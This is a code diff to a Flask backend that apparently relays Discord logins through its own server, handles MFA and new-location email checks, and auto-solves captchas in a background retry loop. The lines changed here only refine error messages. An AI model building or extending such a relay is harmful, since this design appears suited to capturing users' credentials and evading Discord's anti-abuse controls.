@@ -960,9 +960,30 @@ def api_login():
             print(f'[*] MFA required: mfa={j.get("mfa")}, sms={j.get("sms")}')
             return jsonify(j)
 
-        # Error — forward to frontend
-        print(f'[!] Login result: {j}')
-        return jsonify(j), r.status_code if r else 500
+        # Error — forward to frontend with a clear message
+        err_msg = j.get('message', '')
+        if not err_msg:
+            ckeys = j.get('captcha_key', [])
+            if isinstance(ckeys, list) and ('captcha-required' in ckeys or 'invalid-response' in ckeys):
+                err_msg = 'Captcha verification failed. Please try again.'
+            elif j.get('retry_after'):
+                err_msg = f'Rate limited. Try again in {int(j["retry_after"])}s.'
+            else:
+                err_msg = 'Login failed. Please check your credentials and try again.'
+        # Check for email verify in errors
+        errs = j.get('errors', {})
+        for field_key in errs:
+            if isinstance(errs[field_key], dict):
+                for fe in errs[field_key].get('_errors', []):
+                    if fe.get('code') == 'ACCOUNT_LOGIN_VERIFICATION_EMAIL':
+                        err_msg = fe.get('message', 'New login location detected. Please check your email.')
+        result = {'message': err_msg, 'error': err_msg}
+        if j.get('errors'):
+            result['errors'] = j['errors']
+        if j.get('retry_after'):
+            result['retry_after'] = j['retry_after']
+        print(f'[!] Login result: {err_msg} | raw: {j}')
+        return jsonify(result), r.status_code if r else 500
 
     except Exception as e:
         import traceback
@@ -1089,7 +1110,17 @@ def _bg_solve(sid):
                 sess['retry_payload'].pop('captcha_key', None)
                 sess['retry_payload'].pop('captcha_rqtoken', None)
             else:
-                sess['result'] = j
+                # Extract best error message from Discord response
+                err_msg = j.get('message', '')
+                if not err_msg and j.get('captcha_key'):
+                    err_msg = 'Captcha verification expired. Please try again.'
+                if not err_msg:
+                    err_msg = 'Login failed. Please check your credentials.'
+                print(f'[bg:{sid}] Error result: {j}')
+                sess['result'] = {'error': err_msg, 'message': err_msg}
+                # Also include errors dict if present for frontend parsing
+                if j.get('errors'):
+                    sess['result']['errors'] = j['errors']
                 sess['result_code'] = r.status_code if r else 500
 
         sess['status'] = 'done'
